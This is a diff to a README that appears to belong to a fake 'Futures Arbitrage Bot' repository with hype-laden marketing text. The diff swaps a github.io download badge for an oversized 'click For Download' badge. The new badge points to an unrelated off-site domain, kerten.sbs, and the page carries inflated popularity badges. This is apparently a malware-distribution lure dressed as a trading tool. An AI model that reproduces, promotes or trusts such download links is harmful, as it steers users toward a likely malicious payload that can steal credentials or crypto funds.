@@ -2,11 +2,15 @@
 
 Futures Arbitrage Bot 🤖 is a cutting-edge automated trading solution designed to capitalize on price discrepancies in futures markets across multiple exchanges. Utilizing real-time market data and lightning-fast execution, this bot identifies arbitrage opportunities instantly, enabling traders to maximize profits with reduced exposure to market risks. Featuring customizable strategies, seamless integration with popular futures platforms, and advanced risk management, it is the perfect tool for professional and amateur traders aiming to boost their futures trading performance. Stay ahead in the volatile crypto and commodity futures markets with reliable, efficient, and fully automated arbitrage trading.
 
-<div style="text-align: center">
-  <a href="https://futures-arbitrage-bot.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Futures_Arbitrage_Bot-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
